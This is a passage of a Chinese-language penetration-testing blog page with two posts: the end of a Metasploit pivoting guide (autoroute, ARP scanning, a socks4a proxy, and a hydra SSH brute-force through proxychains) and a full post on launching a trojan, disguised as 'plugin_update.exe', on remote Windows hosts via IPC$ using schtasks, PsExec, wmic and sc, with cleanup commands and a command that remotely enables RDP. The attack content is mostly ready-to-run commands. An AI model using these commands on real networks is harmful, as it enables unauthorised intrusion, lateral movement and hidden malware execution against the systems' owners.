<p>2,之后,在meterpreter中添加好通向对方内网的路由<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run autoroute -s <span class="number">192.168</span>.<span class="number">244.0</span>/<span class="number">24</span></div><div class="line">meterpreter &gt; route flush  不用的时候,记得删掉就行</div></pre></td></tr></table></figure></p>
<p><img src="/img/ipconfig meter autoroute.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run post/windows/gather/arp_scanner RHOSTS=<span class="number">192.168</span>.<span class="number">244.0</span>/<span class="number">24</span> 我们可以通过arp先粗略的扫一眼目标内网的机器大概有多少</div></pre></td></tr></table></figure>
<p><img src="/img/msf arpscanner .jpg" alt=""><br></p>
<p>3,接着,我们就可以利用msf的sock4a模块,对目标内网进行socks4代理,其实,这个代理通道本身是通过meterpreter隧道建立的,需要注意的是,socks是代理不了偏底层的协议的,它最多只能在tcp这一层往上[这里不妨先好好了解下socks协议],再往下走,比如,icmp和arp就不太好使了,感觉很多地方写东西都不怎么负责任,有些误导,听那感觉,好像socks代理进去以后就什么都能搞了一样,是的,如果只是单单基于tcp往上的通信确实是可行的,但比如像arp嗅探这种呢,个人就不敢苟同了,稍微有点儿常识的人都知道,arp直接是基于网卡的,而我们的socks代理,并不像vpn,在系统中并没有一个实实在在的网卡接口……好了,说到这里想必大家已经很清楚了,我就不再多扯了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; use auxiliary/server/socks4a </div><div class="line">msf auxiliary(socks4a) &gt; set srvhost <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span></div><div class="line">msf auxiliary(socks4a) &gt; set srvport <span class="number">1080</span></div><div class="line">msf auxiliary(socks4a) &gt; run</div></pre></td></tr></table></figure></p>
<p><img src="/img/msf sock4a.jpg" alt=""><br></p>
<p>4,最后,在proxychians.conf中设置好代理,就可以对目标进行正常的内网渗透了,到这里想必大家都应熟悉该怎么搞了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/proxychains.conf</span></div><div class="line"><span class="comment"># proxychains hydra -l root -P pass.txt -f -t 20 ssh://192.168.244.132</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/msf sock4a proxychians.jpg" alt=""><br><br><img src="/img/msf sock4a ssh res.jpg" alt=""><br></p>
<p>5,当你搞懂了上面的单层代理之后,对于多级内网代理,其实本质还是一样,非常简单,比如,你现在通过这个机器又拿到了内网的另一台机器的meterpreter,但你发现在这个meterpreter上还存在另一个内网,你只需要再在这个meterpreter上添加一层那个内网段的路由,然后再bind进去就可以了,循环往复,你就可以把目标的所有内网段都翻一遍,其内部依然是由meterpreter隧道来完成的,至于meterpreter隧道的内部实现,其实你无需太过关心,因为自己一直也理解的不够透彻,但大致通信过程还是非常清晰的,如果只是单单把它用起来,当然没有任何问题,但还是希望,如果哪位表哥对meterpreter隧道整个通信细节都搞的特别通透了,也能告诉我一声,小弟感激不尽</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/24/ipc-reverse-shell/">
                win内网中利用ipc弹shell 小记
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-24</span>
            
            
            
                <span class="category">
                    <a href="/categories/ipc-note/">ipc note</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>先把马拷到目标机器上再说:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># net use <span class="symbol">\\</span>192.168.3.168<span class="symbol">\i</span>pc$ /user:administrator "admin!@#45"</div><div class="line"># copy shell.exe <span class="symbol">\\</span>192.168.3.168<span class="symbol">\c</span>$<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\p</span>lugin_update.exe</div></pre></td></tr></table></figure></p>
<p>1, 常规的copy[xcopy] &amp; schtasks(按说ipc建立以后,schtasks就不用带账号密码了,尤其我这里还是以system权限运行[本身就是不需要账号密码的],但实际测试中不带就拒绝访问,保险起见还是带上):<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># schtasks /create /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /<span class="keyword">tr</span> <span class="keyword">c</span>:\windows\temp\plugin_update.<span class="keyword">exe</span> /sc once /<span class="keyword">st</span> <span class="number">10</span>:<span class="number">29</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /RU System  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span> </div><div class="line"># schtasks /run /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span>  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span>  你也可以不用等,让目标立即运行任务</div><div class="line"># schtasks /F /<span class="keyword">delete</span> /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/schtasks reverse shell head.jpg" alt=""><br><img src="/img/schtasks reverse shell s.jpg" alt=""><br><img src="/img/schtasks reverse shell system.jpg" alt=""><br></p>
<p>2, 通过psexec的方式(对方admin$开启即可,简单粗暴,退出的时候可能[如果你是用的交互],只是可能会有服务残留,实际测试中并没有,种马的时候注意不要交互,要不然会一直卡在哪里)<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">PsExec</span><span class="selector-class">.exe</span> <span class="selector-tag">-accepteula</span> \\192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.36</span> <span class="selector-tag">-d</span> <span class="selector-tag">-u</span> <span class="selector-tag">administrator</span> <span class="selector-tag">-p</span> <span class="selector-tag">admin</span> <span class="selector-tag">c</span>:\<span class="selector-tag">windows</span>\<span class="selector-tag">temp</span>\<span class="selector-tag">plugin_update</span><span class="selector-class">.exe</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/psexec shell.jpg" alt=""><br></p>
<p>3, 通过wmic的方式来远程执行任意指令[ 代表工具 winexec ]:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># wmic /node:<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.168</span> /user:administrator /password:admin!@#<span class="number">45</span> process <span class="keyword">call</span> create <span class="string">"c:\windows\temp\plugin_update.exe"</span></div><div class="line"># wmic /node:<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.36</span> /USER:administrator /password:admin PATH win32_terminalservicesetting WHERE (__Class!=<span class="string">""</span>) <span class="keyword">CALL</span> SetAllowTSConnections <span class="number">1</span>  远程开启对方的rdp,<span class="number">08</span>以后的系统可能不太好使</div></pre></td></tr></table></figure></p>
<p><img src="/img/wmic shell.jpg" alt=""><br></p>
<p>4,通过sc创建临时服务的方式(记得事先建立好连接,可能需要把exe,bat先注册一下,不然会一直报1053错误(哪位大表哥如果知道怎么更好的解决,还望能告诉小弟一声,感激不尽),但,其实也并不影响,虽然服务报错,但马还是会照常执行(记得shel弹回来以后马上迁徙shell进程,动作要快,不然很快就会断掉),只要shell弹回来就好了,用完就顺手删掉了,关于sc的更多选项请自行查看命令帮助):<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> net use \\192.168.3.168\ipc$ /user:administrator <span class="string">"admin!@#45"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 create <span class="string">"patch_update"</span> binpath= <span class="string">"cmd /c c:\windows\temp\plugin_update.exe"</span>  这里注意下等号后面的空格别漏了</span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 start <span class="string">"patch_update"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 delete <span class="string">"patch_update"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> net use \\192.168.3.168\ipc$ /del</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/sc create del.jpg" alt=""><br><br><br></p>
<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥技术含量,简单记录下,留给有需要的人,搞清楚一些方法的利用前提就好(适合在域中或普通的win内网中)</p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/2/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/4/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klionsec">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:klionsec@gmail.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    <h2>blog by klion</h2>
                </div>
            </div>
        </div>
    </div>
</footer>


<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>